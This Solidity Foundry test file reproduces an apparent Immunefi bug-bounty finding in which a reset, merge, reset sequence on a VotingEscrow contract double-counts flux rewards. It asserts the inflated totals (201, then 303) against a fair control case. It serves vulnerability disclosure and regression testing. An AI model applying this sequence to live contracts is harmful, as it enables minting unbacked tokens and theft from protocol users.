// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./38179-malicious-user-can-mint-unlimited-flux-tokens-immunefi-alche.sol";

contract UnlimitedFluxMintTest is Test {
    /// @notice HARM: run() proves reset -> merge -> reset mints 201 flux
    ///         units for locked value whose fair (single-reset) total is
    ///         only 101 -- matching the finding's own PoC assertion formula
    ///         exactly: claimed == 2*token1Flux + token2Flux.
    function test_exploit_resetMergeResetDoubleCountsFlux() public {
        Exploit e = new Exploit();
        e.run();

        uint256 finalUnclaimed = e.flux().unclaimedFlux(e.tokenId2());
        assertEq(finalUnclaimed, 201 ether, "double-counted flux: 2*100 + 1");
    }

    /// @notice Isolates that repeating reset -> merge -> reset a SECOND time
    ///         against a fresh small lock compounds the over-mint further --
    ///         demonstrating the "repeat this to mint unlimited flux" claim.
    function test_exploit_repeatingTheSequenceCompoundsFurther() public {
        FluxToken flux = new FluxToken();
        VotingEscrow ve = new VotingEscrow(flux);

        uint256 id1 = ve.createLock(100 ether);
        uint256 id2 = ve.createLock(1 ether);

        ve.reset(id1); // +100
        ve.merge(id1, id2); // value[id2] = 101, unclaimed[id2] = 100
        ve.reset(id2); // +101 -> unclaimed[id2] = 201

        // Create a new small lock and repeat: merge it into id2, reset again.
        uint256 id3 = ve.createLock(1 ether);
        ve.merge(id3, id2); // value[id2] = 102, unclaimed[id2] += 0 (id3 never reset)
        ve.reset(id2); // +102 -> unclaimed[id2] = 303

        assertEq(flux.unclaimedFlux(id2), 303 ether, "further compounding after a second merge+reset round");
        assertGt(flux.unclaimedFlux(id2), ve.value(id2), "unclaimed flux now exceeds even the fully-inflated locked value");
    }

    /// @notice Control: resetting each tokenId exactly ONCE, with no merge in
    ///         between, produces the fair total (101) -- isolating that the
    ///         bug requires the merge-then-reset-again sequence.
    function test_control_singleResetPerTokenIsCorrect() public {
        FluxToken flux = new FluxToken();
        VotingEscrow ve = new VotingEscrow(flux);

        uint256 id1 = ve.createLock(100 ether);
        uint256 id2 = ve.createLock(1 ether);

        ve.reset(id1);
        ve.reset(id2);

        uint256 total = flux.unclaimedFlux(id1) + flux.unclaimedFlux(id2);
        assertEq(total, 101 ether, "fair total: 100 + 1, no double count without merge+re-reset");
    }
}
